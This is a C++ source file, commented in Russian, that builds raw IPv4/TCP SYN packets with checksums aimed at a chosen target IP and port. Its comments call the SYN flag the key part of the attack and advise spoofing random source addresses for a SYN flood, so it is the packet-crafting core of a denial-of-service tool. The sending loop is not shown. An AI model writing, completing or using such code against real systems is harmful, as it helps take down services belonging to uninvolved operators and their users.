#include "packet.hpp"
#include "../utils/checksum.hpp" // Наш модуль!
#include <cstring>           // Для memset
#include <iostream>

// Константы для сырого пакета
const int IP_HEADER_LEN = 20; // 20 байт - стандартная длина IP-заголовка
const int TCP_HEADER_LEN = 20; // 20 байт - стандартная длина TCP-заголовка
const int TOTAL_PACKET_LEN = IP_HEADER_LEN + TCP_HEADER_LEN;

// Конструктор
PacketGenerator::PacketGenerator(const TargetInfo& target)
    : target_(target), buffer_(TOTAL_PACKET_LEN) // Инициализируем буфер
{
    // Обязательный профессиональный шаг: обнуляем буфер перед заполнением
    std::memset(buffer_.data(), 0, TOTAL_PACKET_LEN);
}

// Главный метод сборки
std::vector<char> PacketGenerator::get_raw_packet() const {
    // 1. Указатели на начало IP и TCP заголовков
    struct iphdr* ip_h = (struct iphdr*)buffer_.data();
    struct tcphdr* tcp_h = (struct tcphdr*)(buffer_.data() + IP_HEADER_LEN);

    // 2. Заполнение заголовков
    fill_ip_header(ip_h);
    fill_tcp_header(tcp_h);
    
    // 3. Расчет контрольных сумм (должен быть последним!)
    // Так как метод const, мы не можем вызвать calculate_checksums
    // Поэтому логика расчета в этом случае должна быть тут (или метод не должен быть const).
    
    // 3.1 IP Checksum
    ip_h->check = 0; // Обнуляем поле перед расчетом
    ip_h->check = checksum((uint16_t*)ip_h, IP_HEADER_LEN);

    // 3.2 TCP Checksum (Самая сложная часть: требует PseudoHeader)
    struct PseudoHeader psh;
    psh.source_ip = ip_h->saddr;
    psh.dest_ip = ip_h->daddr;
    psh.tcp_length = htons(TCP_HEADER_LEN); // Длина в сетевом порядке байтов
    
    // Буфер для склейки PseudoHeader + TCP Header
    int psh_size = sizeof(PseudoHeader) + TCP_HEADER_LEN;
    std::vector<char> psh_buff(psh_size);

    std::memcpy(psh_buff.data(), &psh, sizeof(PseudoHeader));
    std::memcpy(psh_buff.data() + sizeof(PseudoHeader), tcp_h, TCP_HEADER_LEN);

    tcp_h->check = 0; // Обнуляем поле перед расчетом
    tcp_h->check = checksum((uint16_t*)psh_buff.data(), psh_size);
    
    return buffer_;
}

// Вспомогательная функция: Заполнение IP-заголовка
void PacketGenerator::fill_ip_header(struct iphdr* ip_h) const {
    // 4 бита версия (IPv4) и 4 бита длина заголовка (в 32-битных словах, 20 байт = 5 слов)
    ip_h->version = 4;
    ip_h->ihl = 5;
    ip_h->tos = 0; // Тип сервиса
    ip_h->tot_len = htons(TOTAL_PACKET_LEN); // Общая длина пакета в сетевом порядке
    ip_h->id = htons(12345); // ID пакета (можно рандомизировать)
    ip_h->frag_off = 0; // Флаг фрагментации
    ip_h->ttl = 64; // Time to Live
    ip_h->protocol = IPPROTO_TCP; // TCP = 6
    ip_h->check = 0; // Будет рассчитана позже
    
    // Исходный IP: Случайный или IP машины (для SYN Flood лучше рандомизировать)
    // Сейчас используем IP машины (localhost), для простоты:
    ip_h->saddr = inet_addr("127.0.0.1"); 
    // Целевой IP: конвертируем строку IP в сетевой формат
    ip_h->daddr = inet_addr(target_.ip.c_str()); 
}

// Вспомогательная функция: Заполнение TCP-заголовка
void PacketGenerator::fill_tcp_header(struct tcphdr* tcp_h) const {
    // Порты
    tcp_h->source = htons(54321); // Произвольный исходный порт (рандомизировать!)
    tcp_h->dest = htons(target_.port); // Целевой порт в сетевом порядке
    
    // Последовательности
    tcp_h->seq = htonl(10000); // Sequence Number (можно рандомизировать)
    tcp_h->ack_seq = 0; // ACK = 0 для SYN-пакета
    
    // Длина заголовка (Data Offset): 5 слов (20 байт)
    tcp_h->doff = 5;
    
    // Флаги TCP (Ключевая часть атаки!)
    tcp_h->syn = 1; // Устанавливаем флаг SYN (синхронизация)
    tcp_h->ack = 0;
    tcp_h->psh = 0;
    tcp_h->rst = 0;
    tcp_h->fin = 0;
    
    tcp_h->window = htons(5840); // Размер окна
    tcp_h->check = 0; // Будет рассчитана позже
    tcp_h->urg_ptr = 0; // Указатель срочности
}
